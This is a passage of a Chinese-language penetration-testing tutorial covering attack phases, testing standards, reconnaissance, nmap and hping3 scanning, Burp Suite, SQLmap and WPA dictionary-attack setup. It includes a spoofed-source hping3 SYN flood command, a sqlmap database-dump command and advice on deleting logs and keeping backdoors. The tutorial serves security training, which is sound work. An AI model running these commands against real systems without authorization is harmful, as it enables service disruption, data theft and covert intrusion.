- 第三方保密条款：合同还需明确你不会向任何第三方或竞争对手透露任何信息，或提供信息副本。这有助于建立你与公司之间的信任，毕竟你即将对其发起攻击以测试信息是否会被窃取。
- 赔偿条款：保护渗透测试人员免受任何法律或财务责任，因为渗透测试结果有时可能会导致公司资产损失或损坏。
- 报告与职责部分：这应是指导性文件，明确测试执行的方法论，以及你汇报测试流程的方式。
### 信息收集
攻击前阶段的下一项是信息收集，可通过多种方式完成：
- 被动侦察：利用公开记录，或对公司进行轻度非侵入式调研（例如简单的谷歌搜索）。
- 主动监控：作为被动方法的对立面，开展更具侵入性的主动侦察。
- 网络画像：获取Web服务器或FTP服务器的目录结构，整理所有基于Web的表单、允许的用户输入类型、表单提交目的地以及弹出错误信息。这些错误信息可帮助识别第三方链接和应用。
信息收集阶段耗时较长，但能同时保护你和客户，因此双方需明确预期水平。

# 第6章 渗透测试：第2阶段
## 攻击阶段
渗透测试第2阶段为攻击阶段。你在攻击前阶段收集的所有信息，都能帮助你制定周密的攻击策略。攻击阶段涉及入侵目标，你可以针对在攻击前阶段发现的漏洞利用方式发起攻击，甚至利用弱安全策略或密码策略之类的漏洞尝试获取系统访问权限。
需要注意的是，攻击者仅需要找到一处入口或一种机制即可入侵，因此客户或公司需要防范所有可能的风险点。你不能再保持被动，而需要主动出击。一旦合同敲定，你获得了测试授权，请按以下步骤操作：
1. 首先，尝试通过查看对外暴露的机器及其响应情况来突破外围防线。
2. 进入系统后，对目标进行枚举。如果你清楚目标是什么，获取目标会更容易。
3. 获取目标后，提升权限，以便你能对该特定系统执行更多操作。
4. 最后，通过执行、植入并撤回rootkit，确保你能重新进入系统。
## 外围测试方法
测试外围的主要方式是针对防火墙本身，通过发送和构造数据包来检查防火墙的响应：
- 测试防火墙如何处理分片、重叠分片以及数据包洪泛。
- 构造数据包检查防火墙的访问控制列表（ACLs），明确哪些流量被允许通过、哪些不被允许，即技术上许可和拒绝的内容。
- 尝试连接SSH、FTP甚至Telnet等各类协议，检查协议过滤规则。

你还需要尝试通过发送持续TCP连接、查看防火墙的处理方式，甚至尝试传输UDP连接，来测试不同拒绝服务攻击的阈值。通过这一步，你能了解防火墙设置的阈值具体是多少。你还可以尝试发送一些异常URL，查看IDS（入侵检测系统）的响应。你也可以尝试测试Web服务对POST请求、DELETE请求、COPY请求等各类请求的响应方式。

接下来，你需要开始枚举主机。枚举主机的目的是尽可能多地获取目标主机的信息。你或许在前期测试环境中已经发现了一些信息，但攻击阶段能让你获取到更多动态信息。而你要发现的这类边界信息可能包括：主机ID、主机描述等，这些信息能帮助你确定主机的物理位置。你还需要整理这些主机的网络可访问性清单。

完成主机枚举后，下一步就是获取目标权限。因为你已经掌握了整个网络的信息，至少也掌握了其中相当大一部分的信息。基于你已获取的信息，你可以针对这些漏洞展开行动。你可以通过探测攻击来获取更多关于目标的信息，也就是说，你会对你发现的主机发起不同类型的攻击，以判断哪些主机存在漏洞。因此，你必须运行漏洞扫描。

你还可以通过基础方式获取目标权限，比如使用所谓的可信系统。这意味着你可以通过社会工程学攻击合法获取的信息，来尝试访问设备的资源。获取目标权限后，下一步就是提升权限。有时攻击者会直接进行权限提升，因此作为渗透测试人员，你需要尝试利用操作系统或应用的设计漏洞、缺陷，甚至是操作系统的错误配置，尝试将普通用户的应用访问权限提升至高权限用户的权限。攻击者通常会进行权限提升，以执行不同类型的恶意操作，比如删除文件、查看敏感信息，或是安装可帮助他们后续再次入侵的程序，例如木马、病毒。这类程序在技术上被称为后门。

你可以通过利用安全策略不完善的问题，或是利用未经过测试的邮件、网站代码，尝试获取可导致权限提升的信息。你也可以通过暴力破解攻击实现权限提升。暴力破解非常耗时，目前有大量可用工具，例如密码破解器、木马，甚至社会工程学手段。社会工程学是攻击者最常用、最容易得手的入侵方式之一，因为这种手段很难追踪。

完成账户权限提升后，下一步你需要尝试执行操作、部署工具并撤回痕迹。部分系统存在拒绝服务攻击、缓冲区溢出漏洞，还容易感染ROOT套件、木马、恶意软件等老旧病毒。如果你成功部署了可获取更多信息或系统资源的ROOT套件或木马，你需要尝试通过删除日志文件、隐藏你做出的修改来抹除痕迹。作为渗透测试人员，你还需要确保自己可以修改系统设置且不被发现，也就是要验证自己是否会被检测到。

完成以上所有操作后，你需要确保自己可以通过后门再次进入系统，同时查看是否存在任何告警，例如工程师可能收到或注意到的邮件告警。

# 第7章 渗透测试第3阶段
如果你认为攻击前步骤或实际攻击步骤是最重要的，那从技术角度来说这就错了。从攻击视角来看，最关键的步骤是攻击后阶段，因为作为渗透测试人员，你有义务清理你留下的痕迹。你需要确保将所有系统恢复到测试前的状态，不能搞乱后直接离开。因此，你需要删除你上传的所有文件、你修改过的所有数据，还要确保恢复这些数据和所有你更改过的设置。这也正是为什么记录每一步操作至关重要的原因之一。如果你进行了权限提升，你还必须撤销所有提升的权限和修改的用户设置。你还需要确保恢复你在DNS或任何IP地址层面修改过的网络配置。总结来说，你必须将网络状态完全恢复到你进入之前的样子。如果你以任何方式修改过任何系统的注册表，你也必须确保将其恢复到原有设置。有时你可能还会创建不同的共享和连接，你也必须撤销这些操作，同时你还需要确保记录所有捕获的日志以及被修改的日志条目。完成以上操作后，你需要分析结果，不能制造问题，而要开发解决方案。完成所有工作后，你需要将这些文档提交给客户，同时你需要识别处于风险中的关键系统和关键资源，并制定出需要优先修改的事项清单。

# 第8章 渗透测试标准
你进行渗透测试的不同方式取决于你选择使用的方法论，目前存在许多相关标准。下面我们就介绍其中一些，帮助你了解哪种最适合你。

首先我们来了解OSSTMM，它的全称是《开源安全测试方法手册》。这套标准的渗透测试旨在实现高安全矩阵，总体而言被认为是最高级别测试的标准之一。

还有一个名为OWASP的标准，全称是开放式Web应用安全项目。OWASP是一种开源方法论，包含大量可提供诸多帮助的工具，还拥有知识库，以及名为ZAP（Zed Attack Proxy，即泽德攻击代理）的工具。ZAP是一款可自动帮你发现Web应用漏洞的工具，最初是为Web开发者设计的，但渗透测试人员也可以使用这款工具。

还有一个名为ISSAF的框架，全称是信息系统安全评估框架。ISSAF也是一套关于如何开展渗透测试的开源项目，由名为公共信息系统安全小组的团体提供支持。

另一个你需要了解的标准是NIST，全称是美国国家标准与技术研究院。针对NIST，你需要知道这是一家联邦技术机构，会与产业界合作开发并应用相关技术、测量方法和标准。

还有LPT标准，全称是EC-Council注册渗透测试师。这是一套专有方法论，此外还有McAfee旗下的Foundstone标准，以及IBM推出的ISS标准。针对IBM，他们会为你提供测试服务，还曾推出过一款名为Proventia的基于签名的产品，该产品目前已停止运营。这是一款多功能安全设备，可提供多种不同服务，助力你保障或测试网络环境的安全。McAfee和Foundstone的情况也是如此，从技术上讲它们已被Intel收购。

EC-Council的LPT要求参考人员完成大量不同的步骤，与CEH（注册道德黑客）认证类似。你需要完成相关课程，并通过包含900美元费用的申请流程，之后你会获得EC-Council Aspen环境的访问权限。你需要在测试环境中开展渗透测试，有30天时间向EC-Council提交报告。

上述这些方法论无论是开源版本还是专有版本，彼此之间都非常相似。每一种方法都能帮助你覆盖所有测试要点。它们都从信息收集阶段开始，这一点我们之前已经提过，核心就是从公开来源、报纸、网络文章、博客或第三方数据源中，尽可能多地收集关于目标或公司的信息。

接下来你需要进行外部渗透测试，寻找可从外部访问的漏洞。之后你会进行漏洞分析，以发现基于软件、操作系统或主机的薄弱点。再之后你会开展内部网络渗透测试，查看内部能暴露哪些信息。接下来你要进行防火墙渗透测试，这是抵御外部攻击的主要防线，你还需要针对DMZ（非军事区，也称为边界网络或屏蔽子网）开展测试。

接下来，你需要验证IDS是否正常运行，能否检测到入侵行为。作为渗透测试人员，你需要查看是否存在任何漏洞，能让攻击者绕过这些系统配置的告警规则。

接下来，你可以使用密码破解方法来识别与密码管理相关的薄弱点。这能帮助你确保系统不会容易受到暴力破解攻击、混合攻击或字典攻击。



这些方法还能确保你覆盖社会工程学渗透测试的相关内容。这类测试既可以通过人工社会工程学手段开展，也可以通过计算机社会工程学方式完成，例如诱导目标打开电子邮件附件。
你还需覆盖应用渗透测试的相关内容，这类测试需要查找与代码相关或后端的漏洞。其中最知名的测试当属SQL渗透测试，SQL注入至今仍是主要的安全威胁。它利用未经过验证的输入变量，通过Web应用传递后端数据库执行的SQL命令，以此实施攻击。
具体效果取决于你在网络中部署路由器和交换机的位置，这些设备会在系统内外逐点转发数据包。如果你攻陷了一台路由器，最终会导致所有连接到该路由器的设备都无法访问互联网。对路由器进行渗透测试时，通常既可以来自互联网侧发起，也可以从内网侧开展。
你还需要关注无线网络的安全情况，这部分需要重点关注公司员工可接入的外部无线网络。这类网络实质上会绕过公司防火墙，因为无线信号无法被有效管控，它会弥漫在空气中无法被肉眼察觉，即便在企业物理边界之外也能接收到信号。你还需要检测加密的强度以及所部署的加密类型。
你还可以通过开展拒绝服务测试，进一步覆盖所有测试环节，避免出现遗漏。你可以尝试通过发送大量数据包或流量淹没目标，让企业网络或电商网站无法处理正常请求从而瘫痪，以此验证其抗压能力。开展拒绝服务攻击测试时，核心目标是找到系统的崩溃阈值。
你还需要考虑失窃设备的安全应对方案，例如在完成所有手机和笔记本电脑的安全加固后，你还需要思考这些设备失窃后会引发什么问题。渗透测试团队可以模拟盗取移动设备，开展离线测试以获取设备中存储的信息。例如不要将目标锁定为销售部门的员工电脑，而应优先针对你提前锁定的IT部门人员发起攻击，因为IT部门人员或中高层管理人员拥有比普通员工更高的权限，能够接触到更多核心业务系统。
你还需要开展源代码渗透测试，如今许多企业都在使用自主开发的应用，但这些应用有时甚至未被纳入安全防护体系。作为渗透测试人员，你可以手动审查源代码，也可以借助ZAP等大量工具辅助完成测试。这类物理渗透测试要求测试团队尝试在营业前、营业中、营业后进入办公场所，但不得实施任何破坏性行为，例如不需要破坏门窗，如果能够轻易撬锁、拆除门禁或是翻越闸机，多数企业是允许这类操作的。部分企业会对这类测试有所顾虑，因此你还需要开展实地走查，为企业提供其现有安全管控措施及潜在绕过方式的客观评估。
此外，还要核查企业是否部署了监控摄像头，如果已部署，需要了解摄像头是否支持通过Web接口进行操控，它们的监控视角是怎样的。例如你可以使用无人机进入相关区域，从摄像头顶部视角查看监控盲区，且不会被发现。总结来看，你需要测试摄像头触发报警的运动阈值，以及其实际监控覆盖范围。
你还需要覆盖数据库相关的测试内容，这部分需要你尝试利用密码破解等方法直接访问数据库中存储的数据，你也可以尝试开展常规的SQL注入攻击，且不限于基于SQL的数据库。
你还需要关注数据泄露风险，这部分要求你判断发现的数据是否包含知识产权、个人隐私信息或敏感数据。这类渗透测试的核心目的是帮助企业防止机密信息泄露到公开市场或竞争对手手中，因此你需要核查哪些人员拥有这些文件的访问权限，同时还需要开展员工安全意识培训，提升其对安全最佳实践的认知。
这类测试更具针对性，如果企业使用了SAP平台，你可以开展渗透测试验证其补丁是否安装正确，因为SAP系统中存储了大量企业核心业务数据，通过测试可以发现攻击者可利用的安全漏洞。
渗透测试还需要覆盖VPN（虚拟专用网络）测试内容，多数企业都允许员工在外出差或居家办公时远程接入公司网络，无论哪种场景，VPN都会与内网建立可信连接。渗透测试人员通常会尝试通过攻陷远程终端、或是侵入VPN隧道的方式获取VPN访问权限，进而接入企业内部网络。此外，你还需要尝试接入VoIP（网络电话）网络，测试是否可以窃听通话内容或发起拒绝服务攻击，阻断正常通信。
另一个需要关注的是云服务，云安全由服务提供商和客户共同承担责任，云计算还存在诸多安全风险。你还需要开展虚拟设备相关的测试，目前多数企业都已部署虚拟化技术，但宿主机完成补丁更新并不意味着虚拟机（VM）也已完成更新。你可能会发现虚拟设备完成了补丁更新，但宿主机没有，而且由于虚拟环境是物理环境的完整复刻，因此会面临相同的安全风险。如果虚拟机上运行了软件或应用，就会存在安全漏洞，攻击者可不会区分目标是物理机还是虚拟机，对它而言只是普通的攻击目标而已。
开展这类测试时，需要检查企业是否存在已被遗忘的旧技术，并尝试突破这类技术的安全防护，你还需要确认是否存在仍使用默认密码的老旧调制解调器，调制解调器会通过启动标识展示自身信息。
无论是特洛伊木马、计算机病毒还是勒索软件都需要纳入检测范围，例如特洛伊木马可被设计用来窃取敏感信息、删除数据、替换操作系统文件，甚至发起拒绝服务攻击、通过键盘记录器监视用户操作、创建后门或提供远程访问权限。计算机病毒主要用于破坏数据、拖慢系统运行、占用系统资源，此外还要防范勒索软件带来的安全威胁。
作为渗透测试人员，你需要排查所有存在可疑开放端口的情况，此外还需要检查是否存在被感染的系统进程、注册表项、硬件驱动，伪造的Windows服务，哪些程序拥有网络访问权限，以及用户/员工如何处理通过邮件传播的恶意软件或勒索软件等各类情况。
开展渗透测试时，你还需要关注日志管理相关内容，日志文件会记录网络上所有事件的执行主体、内容、地点和时间，因此需要对日志文件进行管理，确保其存储在安全的位置，同时监控日志是否存在被篡改的情况。切勿等到事故发生后才亡羊补牢，你还需要测试文件的完整性，企业是如何保障文件完整性的？你需要确认不存在文件被篡改的情况，尤其是操作系统文件的完整性。这类问题也与恶意软件相关，你需要尝试识别数据篡改者、篡改后的文件属性，以及这些篡改记录的存储和维护方式。
在移动设备方面，如今人手一台移动设备已成为常态，所有人都倾向于使用移动端办公，BYOD（自带设备）部署模式也越来越流行，因此你需要开始监测和排查员工的移动设备，因为这些便携式设备运行着不同的操作系统。

以及移动设备和各类不同应用，都会为我们带来新的安全问题。从技术层面讲，应该始终安排专人监控移动设备。我们之前提到了VoIP（网络电话），此外还有电信和宽带渗透测试。无论你查看的是哪栋楼里的哪类业务，都可以收集到所有人的数据。用户入侵系统最常见的方式之一是通过邮件传播恶意软件和勒索软件，因此你也需要关注邮件安全。邮件是当今全球使用最广泛的通信方式。但关注它的核心原因在于，我们通过邮件存储个人信息和附带的企业数据。例如，如果你能获取到企业首席信息官（CIO）或首席技术官（CTO）的账户权限，可能会对企业造成严重影响。因此，需要从内部和外部两个维度开展邮件安全防护工作。

# 第9章 足迹勘测入门
在开展渗透测试并对目标进行足迹勘测时，核心目标是确定目标的公开可获取信息有哪些。这些信息是互联网上可公开访问的内容，例如网络架构、操作系统、应用程序或用户信息。从研究层面来看，这属于被动信息收集。作为渗透测试人员，你需要尝试一切可能的手段，针对主机或网络收集信息，二者没有区别。在进入渗透测试的下一阶段前，你必须尽最大可能收集到足够多的信息。如果你在任何网站或公开可访问的位置发现了敏感信息，需要在最终报告中将该信息通报给对应组织。如果你发现的信息你认为十分关键，不需要等待一个月甚至一周再提交完整报告，你需要立即通知你的应急联系人。这一攻击阶段能够防范信息泄露，同时也能为后续的社会工程学攻击提供支持。接下来我们看具体操作。

第一步你需要获取正式授权，授权来源是目标方的负责人，可能包含也可能不包含系统管理员。很多时候企业需要了解其系统管理员的工作表现。走完授权流程后，你必须明确测试范围。限制渗透测试范围是必要前提。完成这一步可以帮助你列出需要测试的项目清单，例如系统的IP地址段或子网范围是什么，以及你有哪些权限限制。明确范围后，你需要利用侦察工具针对该范围制定计划并收集信息。

你需要先从搜索引擎入手，比如谷歌、必应或雅虎，任选其一即可，用来查看当前有哪些信息被公开暴露。你也可以查看其他特定站点，例如Facebook这类社交网站，看看企业是否有官方主页或推特账号。接下来你需要查看该企业的好友关系链，因为你可以通过这里找到现有员工，再进一步追溯相关信息。

完成搜索引擎检索后，你可以尝试对目标进行“谷歌黑客”检索。你可以借助SiteDigger这类带图形用户界面的工具，或是谷歌黑客数据库来完成。通过谷歌黑客技术，你可以找到被谷歌搜索引擎抓取、但企业可能并不知道自己这些内容已经被公开的资源，例如打印机或摄像头，这些资源可以帮你获取暴露的IP地址，或是了解对方拥有的设备类型。

完成谷歌黑客检索后，下一步是针对社交网络开展信息收集，比如Facebook、推特或领英。人们在社交网络上往往会放松警惕。虽然不容易直接看到他人的聊天内容，但主动和用户或员工发起对话是收集信息的好方法。你可以找现有员工发起聊天，例如说：“嗨，贵公司看起来非常棒，我一直在考虑加入你们的IT团队，你们内部用的是什么类型的设备？”

下一步是对目标网站进行足迹勘测，你可以用BlackWidow或WebSite Copier这两款工具完成。使用这些工具时，首先你需要下载目标网站的完整内容，以便离线查看网站代码。你需要记住，网页端展示给你的所有内容，本质上都是下载到你系统中的文件。因此为什么不下载一份完整的网站副本，这样你就可以查看他们的后端运行逻辑，尤其是当前端向后端发起请求时的具体实现。

接下来你可以开展邮件足迹勘测。你可以使用`nslookup`这类高效工具，查询邮件服务器的DNS名称和IP地址。从邮件相关信息中你可以获取的内容包括：他们使用的加密方式，以及邮件环境搭配的其他服务。你也可以查清楚他们的邮件服务器是如何托管的，以及使用了哪家托管服务商。

接下来你可以开展竞争情报收集。竞争情报是大部分企业用来了解竞争对手的手段，攻击者可以使用完全相同的资源获知对方的业务动向，同时也是企业发现竞争对手当前正在推进哪些项目的绝佳途径。

接下来你可以开展“whois”侦察，以此查清IP地址段或域名的归属方。你可以使用Domain Dossier或SmartWhois这类工具完成该操作。有时候这些工具还会基于DNS开展必要的枚举，这也是你的下一步工作。

开展DNS侦察时，你可以使用Sam Spade或DNSstuff这类工具，不过你也可以使用功能非常强大的`nslookup`命令。你需要开展DNS侦察的原因之一是，你可以借此确定网络中的关键主机，这些信息既可以用于开展社会工程学攻击，也能在DNS投毒攻击中使用。

下一步是开展网络侦察。你可以使用Path Analyzer Pro这类工具，它能展示数据包的传输路径，也可以使用Network Pinger或VisualRoute工具，它们可以帮助你获取更多目标网络的相关信息。这些工具能帮你绘制更清晰的目标网络拓扑图，明确你面对的网络结构。

你也可以尝试开展包含肩窥的社会工程学攻击，通过观察他人的操作来收集信息。其他社会工程学攻击手段还包括翻找垃圾和窃听。这些手段可以帮助你收集到组织使用的安全产品、操作系统、软件版本、网络布局、IP地址以及服务器名称等信息。

你必须确保把你发现的所有信息都记录下来。因为你后续需要借助这份文档和你收集的所有信息，来理解和分析目标的安全态势。你会惊讶于通过这种方式能推导出多少有价值的信息。因此在这一阶段投入尽可能多的时间非常重要，这样你才能为后续的所有操作绘制出清晰的行动地图。

针对目标设备开展扫描时，你需要明确网络中有哪些系统是存活的，以及它们的在线频率如何，另外还需要确认它们是否仅在特定时间段内在线。你还需要探测这些节点上当前开放的端口有哪些，以及运行着哪些服务。以上这些信息都能帮助你判断目标设备是否存在可利用的漏洞。另一种网络扫描方式是探测是否可以获取到服务标识。完成这一流程后，你就知道哪些端口需要关闭，如果存在服务标识，你可以隐藏或修改它。你还需要查看是否存在不需要运行的服务，如果不需要，你应该关闭这些服务。这也有助于你了解如何标准化防火墙和入侵检测系统的规则，同时你也可以发现配置错误的向量，以及你需要采取哪些措施修复这些配置错误。

### 路由映射与 Traceroute
接下来，你需要对目标网络执行 ping 扫射。你也可以先扫描目标网络以识别存活主机，再使用“nmap”对目标执行多种端口扫描技术。“路由映射”最初是一种诊断工具，用于查看 IP 数据包从一台主机传输到另一台主机的路径。它通过数据包中的“TTL（Time to Live，生存时间）”字段工作：两点之间的每一跳都会生成一条“ICMP 超时”消息。ICMP 是互联网控制消息协议（Internet Control Message Protocol）的缩写。这些数据包会统计经过的主机数量和传输路径。例如，如果你的 Kali Linux 主机是源主机，Google 服务器是目标主机，中间有两台路由器（R1 和 R2）：
首先，Kali 主机向 R1 发送 TTL 为 1 的探测包，R1 收到后将 TTL 减 1，再返回一条 ICMP 超时响应。接下来，Kali 向 R1 发送 TTL 为 2 的探测包，R1 将 TTL 减为 1 后转发给 R2，R2 收到探测包后将 TTL 减为 0，返回 ICMP 超时响应。最后，Kali 向 R1 发送 TTL 为 3 的探测包，R1 将其转发给 R2，R2 将 TTL 减为 0 后转发给 Google 服务器，Google 服务器会返回“目标端口不可达”的响应——因为大多数服务器会默认拦截发送到关闭端口的未请求探测包。
在 Kali Linux 中，“traceroute”是一个基于 ICMP 数据包绘制网络路由的命令行工具。要追踪到 Google 服务器的路由，运行以下命令：
```traceroute www.google.com
```
你会看到到达 Google 服务器的路由通常需要 12 到 16 跳。如果你使用“nmap”执行相同的测试，会得到略有不同的结果，因为“nmap”使用 TCP 协议实现相同功能，而该协议几乎不会被所有防火墙拦截。
### 基础 Nmap 扫描命令
```nmap -sP 10.0.0.0/24
```
对网络执行 ping 扫射，列出所有响应 ping 请求的存活主机。
```nmap -p 1-65535 -sV -sS -T4 target
```
完整的 TCP 端口扫描，附带服务版本检测——这通常是我的首选扫描方式。我发现 T4 比 T5 更准确，同时速度依然很快。
```nmap -v -sS -A -T4 target
```
输出详细日志，执行 T4 时序的隐形 SYN 扫描，执行操作系统与版本检测，并提供 traceroute 结果和对目标服务的脚本扫描结果。
```nmap -v -sS -A -T5 target
```
输出详细日志，执行 T5 时序的隐形 SYN 扫描，执行操作系统与版本检测，并提供 traceroute 结果和对目标服务的脚本扫描结果。
```nmap -v -sV -O -sS -T5 target
```
输出详细日志，执行 T5 时序的隐形 SYN 扫描，并执行操作系统与版本检测。

```nmap -v -p 1-65535 -sV -O -sS -T5 target
```
输出详细日志，执行 T5 时序的隐形 SYN 扫描，执行操作系统与版本检测，并对全端口范围执行扫描。
当你在命令行输出中看到三个点（“...”）时，意味着数据包被拦截了。这通常是由 Checkpoint 或 Cisco ASA 等防火墙导致的，这些防火墙会默认丢弃这类数据包。
### 端口扫描基础
使用“nmap”进行端口扫描的过程是连接 TCP 和 UDP 端口，以确定目标系统上运行的服务和应用程序。每台计算机的 TCP 和 UDP 端口总共有 65535 个。部分端口与特定服务关联，例如 TCP 21 端口用于 FTP。前 1024 个端口（0-1023）被称为“知名端口”，被通用、广泛认可的标准服务使用。讨论端口扫描时，Nmap 总是会首先被想到。它是一个通用端口扫描工具，依赖主动栈指纹识别技术：向目标系统发送特殊构造的数据包，通过操作系统的响应让 nmap 识别出操作系统。要让“nmap”正常工作，至少需要有一个监听端口处于开放状态，且操作系统能够通过指纹识别技术被识别。关于“nmap”我们可以写一整本书；如果你从未使用过它，我强烈建议你探索它的各项功能。此外还有大量资源涵盖了通过 ICMP 回显请求与响应、DNS 查询和主机名解析实现基础主机发现的相关内容。
### 常见防火墙类型
常见的防火墙类型包括状态检测防火墙、无状态防火墙、区域防火墙和基于策略的防火墙。总结来说，状态检测防火墙允许来自内部网络发起的对外部网络的连接所对应的入站流量。而无状态防火墙则会丢弃入站数据包，除非之前已配置显式的“接受”规则，允许特定源到特定目的地特定端口的流量，否则即使流量源自内部网络也会被拦截。
### 使用 Hping3 进行主机发现
Nmap 使用“traceroute”功能来识别到目标服务器的路径。使用 nmap 识别出 IP 地址后，你可以使用“traceroute”命令来确定你与识别出的终端设备之间的跳数。“traceroute”执行完成后，第一步是对目标 IP 段执行网络 ping 扫射，以识别存活目标。传统上，ping 使用 ICMP 数据包，但 TCP、UDP、ICMP 和 ARP 流量也可用于检测存活主机。互联网上有多种远程扫描器可用于识别存活主机。虽然“nmap”是主要的扫描工具，但 Kali Linux 还包含其他实用工具，例如“hping3”。“hping3”非常实用，因为它可以让你完全控制数据包类型、源数据包和目标数据包。例如，如果你想 ping Google 的服务器，但 Google 拦截了 ICMP ping 请求，你可以改用 TCP SYN 请求来 ping 它。要从命令行以 3 个数据包的计数 ping google.com，使用以下命令：
```ping -c 3 google.com
```
如果你看到 100% 的数据包丢失，说明 Google 拦截了基于 ICMP 的 ping 命令。这并不构成障碍，因为 Kali Linux 包含强大的“hping3”工具。它的用法和 ping 类似：不用输入“ping”，输入“hping3”加上目标地址即可。“hping3”可以通过多种配置方式，利用 ICMP 回复和同时发送到 80 和 443 端口的 TCP 数据包来发现存活主机并映射整个网络。常用参数包括：“-t”用于设置时序（取值为 1-5，其中 1 最慢，5 最快），“-sn”用于主机发现，“-v”用于输出详细日志。

在查看具体的 hping3 使用示例前，我们先总结一下 NTP、SMTP 和 DNS。NTP 是 Network Time Protocol（网络时间协议）的缩写，是一种时间同步协议。遗憾的是，NTP 有时允许你发起查询

# 第11章 使用Hping3进行设备发现
若要发现未直接响应ICMP ping请求的网络设备（无论本地还是远程），我们仍可通过TCP和UDP选项验证设备是否存在。Hping3支持上述所有选项，还支持更多其他功能。如果你确定某设备在线却未收到响应，可能是因为防火墙被配置为阻止ping请求以防范拒绝服务攻击，这一点可以理解，但你仍需要确认该设备处于活跃状态。大型机构通常会通过在防火墙过滤的方式禁用ping回包。不过如果你仍想确认目标的ping可达性，可以使用我们之前提到的其他工具，比如nmap和ZenMAP。
Hping3取代了早期的ping2版本，现在除了ICMP ping之外还支持更多功能，包括：
- 通过TCP发送ping请求
- 通过UDP发送ping请求
- 指纹识别
- 嗅探与欺骗功能
- 高级端口扫描
- 防火墙测试
- 远程运行时间测量
- TCP/IP（OSI模型）协议栈审计
- 高级泛洪工具
- 隐蔽信道创建
- 文件传输能力，以及更多其他功能
Hping3是一款优秀的设备发现工具，默认集成在Kali Linux系统中。它通过命令行界面运行，具备众多功能。要查看所有可用功能，输入：
``` hping3 -h ```
然后按下回车。`h`参数代表帮助，执行后你将看到hping3所有可用选项的完整列表。
使用Hping3时，你不仅可以ping单个地址，还可以同时ping数百个地址。你还可以伪造源IP地址，使其显示为任意你指定的IP，还可以修改ping请求的源接口。因此，几乎无法追溯流量到其真实来源。
我不会介绍Hping3的所有可能用例，但需要提醒你，它很容易被用于发起拒绝服务攻击。
两台网络设备建立连接需要经过TCP三次握手，其第一步是发送SYN请求。SYN是同步（Synchronization）的缩写。如果你向目标设备持续发送SYN请求，设备会被请求淹没，最终受害者PC或任何其他网络设备的CPU将无法承受负载，导致设备关机。相关示例如下：
``` hping3 -S 10.10.10.20 -a 192.168.1.20 22 --flood ```
参数说明：
- **-S**：表示正在发送SYN请求。
- **10.10.10.20**：受害者的IP地址。
- **-a**：指定后续地址为伪造的源地址。
- **192.168.1.20**：伪造的源地址，该地址也会成为次要受害者，因为主要受害者会尝试向这个IP回复发送给它的SYN请求。
- **22**：SSH服务的端口号；你可以指定通过nmap等工具发现的其他开放端口。
- **--flood**：指示Kali Linux以最快速度发送SYN请求。
使用这组命令并非小事。哪怕只运行几秒，也可能严重损坏任何设备的CPU。如果让其运行数分钟，大量设备很可能失去响应并关机。因此我强烈警告，在生产环境中使用该命令前必须获得书面授权。即使想在家用实验环境中练习，也不要让其运行超过几秒，否则可能会对你自己的网络设备造成严重损坏。
# 第12章 Burp Suite代理配置
Burp代理是整个Burp Suite应用的核心组件。它是一款可以拦截浏览器与目标Web服务器之间Web流量的工具。
启动Burp Suite的操作路径为：打开应用程序菜单，选择Kali Linux，再选择十大安全工具，最后从列表中点击Burp Suite。Kali Linux默认集成了Burp Suite的免费版，你也可以使用专业版来解锁应用的所有功能。免费版是学习该工具工作原理的绝佳入门选择。
Burp Suite启动并运行后，要确保代理已启用且在8080端口监听。进入「Proxy」选项卡，点击「Options」选项卡，即可看到代理监听器已激活，正在8080端口监听。
接下来你需要配置浏览器，使其使用Burp Suite监听的端口。针对Firefox浏览器，你可以使用名为《Foxy Proxy》的扩展工具。这款工具可以轻松管理多个代理，并快速在代理之间切换。安装《Foxy Proxy》后，你会看到浏览器地址栏旁有一个带斜杠圆圈的狐狸图标。点击该狐狸图标，选择「添加新代理」。在「代理详情」选项卡中，将手动代理配置设置为`localhost`，代理端口设置为8080。然后点击「常规」选项卡，为代理设置一个名称，最后点击「保存」按钮。
你上述操作的本质是告知浏览器将所有流量路由到本地主机8080端口，也就是Burp Suite配置的监听端口。Burp会接收这些流量并将其代理转发到互联网。保存该配置文件后，右键点击狐狸图标，选择你刚配置的代理配置。在本场景中，你可以将配置文件名设为「Burp Proxy」。需要使用时，只需点击图标即可激活该配置。
浏览器启用代理后，访问目标Web应用即可。回到Burp Suite界面，你会看到「Proxy」和「Intercept」选项卡亮起并变为橙色。如果出现这种情况，说明你已正确完成所有配置。你还会看到Burp已成功捕获该网站的GET请求。
默认情况下，Burp会拦截所有流量。拦截模式会阻止浏览器向Web应用发送任何请求，你可以在请求发出前阅读或修改该请求。如果默认开启拦截功能时你访问任意网站，在关闭拦截按钮前都不会看到任何响应。关闭拦截功能后，Burp会继续捕获所有Web流量，但不会篡改任何请求。你可以根据需求随时开启或关闭拦截功能。此外，你还可以在「History」选项卡中查看所有捕获的请求和响应。

# 第16章 使用SQLmap进行SQL注入
网站中最常见、可被利用的漏洞就是注入漏洞，该漏洞出现的原因是受害网站的输入未受到恰当管控，从而攻击者可以与后端数据库进行交互。评估SQL注入漏洞最有用的工具之一就是SQLmap，这是一个Python工具，能够自动化完成对多种数据库的侦察和利用工作。

按下回车键。执行该命令返回的数据会显示OWASP数据库中的所有可用表。


```sql
sqlmap -u "TARGET_URL" --dump -d database_name -T table_name
```

# 第17章 使用Airodump-ng进行字典攻击
要对受WPA或WPA2保护的无线网络执行字典攻击，我们将按照以下四个步骤进行操作。
第一步，我们需要确定要发起字典攻击的目标接入点的BSSID。
找到要攻击的接入点后，接下来需要选择用于本次攻击的词表。
顾名思义，词表就是一个单词列表，类似词典，我们将把这份单词列表用于尝试破解接入点。
第三步是生成认证流量。这种攻击要生效，我们需要捕获合法用户连接到接入点的流量，因此我们会主动生成这类流量，以便在空中截获。
最后一步是执行字典攻击。本次攻击我们将使用Kali Linux系统。
要完成这一步，你需要打开终端并查看配置。输入`iwconfig`后，你应该能看到两块无线局域网适配器：wlan1是你设备内置的无线网卡，如果你已经成功桥接了设备，那么wlan0就是Kali Linux的虚拟局域网适配器，你后续也将使用这块网卡执行攻击。
因此，你需要做的第一件事是将Kali Linux的无线网卡设为监听模式，但在操作之前，你需要先通过输入以下命令禁用无线局域网适配器：
``` ifconfig wlan0 down ```
接下来输入：
``` iwconfig wlan0 mode monitor ```
这条命令会将你的无线局域网适配器设为监听模式。但要确保无线网卡重新启用，你需要输入以下命令：
``` ifconfig wlan0 up ```
现在你的无线局域网适配器已经重新启用，接下来需要确认它已经处于监听模式，你要输入以下命令：
``` iwconfig ```
在这里，你应该能看到标注为“Mode”的位置，旁边应该显示网卡当前处于监听模式。
